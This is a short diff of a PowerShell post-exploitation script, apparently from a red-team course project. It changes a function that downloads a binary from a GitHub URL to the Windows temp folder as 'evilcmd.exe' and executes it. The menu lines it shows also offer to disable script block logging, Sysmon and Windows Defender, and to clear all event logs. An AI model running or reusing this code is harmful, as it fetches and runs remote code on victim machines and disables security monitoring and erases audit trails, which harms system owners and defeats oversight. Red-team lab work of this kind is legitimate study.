@@ -346,8 +346,8 @@ Function Download-ExecuteBinary
 	#downloads calc.exe from my github account
 	invoke-webrequest -uri "https://github.com/robertriskin/csc842/blob/master/Module%202%20-%20RedTeam-SysInfo-V2/bin/cmd.exe?raw=true" -outfile "c:\windows\temp\evilcmd.exe"
 	
-	#executes the downloaded calc.exe
-	& "c:\windows\temp\evilcalc.exe"
+	#executes the downloaded cmd.exe
+	& "c:\windows\temp\evilcmd.exe"
 }
 
 #Function that clears all event logs
@@ -387,7 +387,7 @@ function Display-PostExploitationMenu
 	Write-Host " 2: Press '2' Disable Powershell Script Block Logging."
 	Write-Host " 3: Press '3' Disable Sysmon."
 	Write-Host " 4: Press '4' Disable Windows Defender."
-	Write-Host " 5: Press '5' Download and execute a binary (calc.exe)."
+	Write-Host " 5: Press '5' Download and execute a binary (cmd.exe)."
 	Write-Host " 6: Press '6' Clear all Windows eventlogs."
 	Write-Host " 7: Press '7' Execution all post exploitation actions."
 	Write-Host " q: Press 'q' to quit the application."
